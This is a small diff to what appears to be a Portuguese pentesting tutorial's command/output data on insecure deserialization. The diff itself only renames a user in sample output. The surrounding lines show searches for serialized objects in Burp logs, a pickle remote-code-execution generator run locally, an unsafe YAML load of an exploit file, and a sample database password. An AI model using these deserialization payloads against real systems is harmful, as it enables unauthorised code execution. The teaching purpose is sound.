@@ -84,7 +84,7 @@ Node serialize-javascript / node-serialize
             cmd: "grep -aErn 'rO0AB|AAEAAAD|/wEP|gAJ|gAR|BAh|O:[0-9]+:\\\"' ~/burp_logs/",
             out: `~/burp_logs/empresa-2026-04-04.log:482:Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAEdXNlcnQABWFkbWlu...
 ~/burp_logs/empresa-2026-04-04.log:1041:__VIEWSTATE=/wEPDwUKLTM4MDIxNzAwM2RkXJ4rW8L0zPQwEzWh2VtnCq2uKQ==
-~/burp_logs/intranet.log:228:user_pref=O:4:"User":2:{s:4:"name";s:8:"wallyson";s:4:"role";s:5:"guest";}
+~/burp_logs/intranet.log:228:user_pref=O:4:"User":2:{s:4:"name";s:3:"ana";s:4:"role";s:5:"guest";}
 ~/burp_logs/api-pedidos.log:721:cart=gAJjX19tYWluX18KQ2FydAo... (base64 pickle!)`,
             outType: "warning",
           },
@@ -508,7 +508,7 @@ else:
           {
             comment: "verificar — desserializar localmente (PERIGOSO em alvo real, ok aqui)",
             cmd: "python3 gen_pickle_rce.py 'id' | python3 -c 'import sys,pickle; pickle.loads(sys.stdin.buffer.read())'",
-            out: `uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`,
+            out: `uid=1000(ana) gid=1000(ana) groups=1000(ana),27(sudo)`,
             outType: "warning",
           },
           {
@@ -550,7 +550,7 @@ DATABASE_PASSWORD = "Empresa@2025!"`,
           },
           {
             cmd: 'python3 -c "import yaml; yaml.load(open(\'/tmp/exploit.yaml\'), Loader=yaml.Loader)"',
-            out: `uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson)
+            out: `uid=1000(ana) gid=1000(ana) groups=1000(ana)
 0`,
             outType: "warning",
           },
